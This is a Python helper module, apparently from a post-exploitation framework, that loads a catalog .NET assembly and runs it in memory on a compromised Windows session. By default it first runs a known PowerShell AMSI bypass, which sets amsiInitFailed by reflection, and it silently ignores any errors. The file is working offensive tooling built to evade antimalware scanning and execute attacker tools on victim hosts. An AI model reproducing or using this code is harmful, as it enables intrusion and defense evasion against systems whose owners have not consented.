#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Invoke a catalog .NET assembly on a Windows session (loadmodule helper)."""

from __future__ import annotations

from typing import Any, Optional

from lib.post.windows.assembly_loader import is_dotnet_pe, resolve_assembly


_AMSI_INIT_FAILED = (
    "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
    ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
)


def run_catalog_assembly(
    module: Any,
    name: str,
    *,
    arguments: str = "",
    type_name: str = "",
    method_name: str = "Main",
    bypass_amsi: bool = True,
) -> str:
    """Resolve ``name`` from data/assemblies and run via win_run_dotnet_assembly_bytes."""
    path, meta = resolve_assembly(name)
    data = path.read_bytes()
    if not is_dotnet_pe(data):
        raise FileNotFoundError(f"{path} does not look like a .NET assembly")

    args = str(arguments or "").strip()
    if not args and meta.get("default_args"):
        args = str(meta["default_args"])
    tn = type_name or str(meta.get("type_name") or "")
    mn = method_name or str(meta.get("method_name") or "Main")

    if bypass_amsi and hasattr(module, "win_run_powershell"):
        try:
            module.win_run_powershell(_AMSI_INIT_FAILED, timeout=10)
        except Exception:
            pass

    return module.win_run_dotnet_assembly_bytes(
        data,
        type_name=tn,
        method_name=mn,
        arguments=args,
    )
